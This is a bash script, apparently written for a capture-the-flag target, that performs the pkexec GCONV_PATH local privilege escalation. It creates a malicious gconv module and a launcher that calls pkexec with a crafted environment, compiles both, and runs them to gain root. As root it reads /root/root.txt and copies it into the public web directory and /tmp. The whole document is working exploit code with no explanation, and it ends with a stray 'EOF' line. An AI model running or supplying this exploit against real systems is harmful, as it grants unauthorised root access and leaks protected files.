#!/bin/bash
cd /tmp
WORKDIR="/tmp/exploit_$$"
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "[+] Creating exploit..."
mkdir -p 'GCONV_PATH=.'
echo '' > 'GCONV_PATH=./exploit'
chmod +x 'GCONV_PATH=./exploit'
mkdir -p exploit

echo 'module UTF-8// EXPLOIT// exploit 2' > exploit/gconv-modules

cat > exploit/exploit.c << 'EOC'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
  setuid(0); setgid(0);
  seteuid(0); setegid(0);
  
  // Set PATH then get flag
  system("export PATH=/bin:/usr/bin:/sbin:/usr/sbin; echo 'FLAG:'; cat /root/root.txt");
  
  // Alternative: use full path and write to multiple locations
  system("/bin/cat /root/root.txt");
  system("/bin/cat /root/root.txt > /var/www/html/flag.txt");
  system("/bin/cat /root/root.txt > /tmp/flag.txt");
  
  exit(0);
}
EOC

cat > exploit/exec.c << 'EOC'
#include <stdlib.h>
#include <unistd.h>
int main(){
  char *env[] = {"exploit", "PATH=GCONV_PATH=.", "CHARSET=EXPLOIT",
                 "SHELL=exploit", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
EOC

echo "[+] Compiling..."
gcc -fPIC -shared -o exploit/exploit.so exploit/exploit.c 2>&1
gcc -o exploit/executor exploit/exec.c 2>&1

echo "[+] Running..."
PATH='GCONV_PATH=.' ./exploit/executor 2>&1

echo "[+] Checking for flag..."
/bin/cat /var/www/html/flag.txt 2>/dev/null || /bin/cat /tmp/flag.txt 2>/dev/null || echo "Flag not found in usual places"
EOF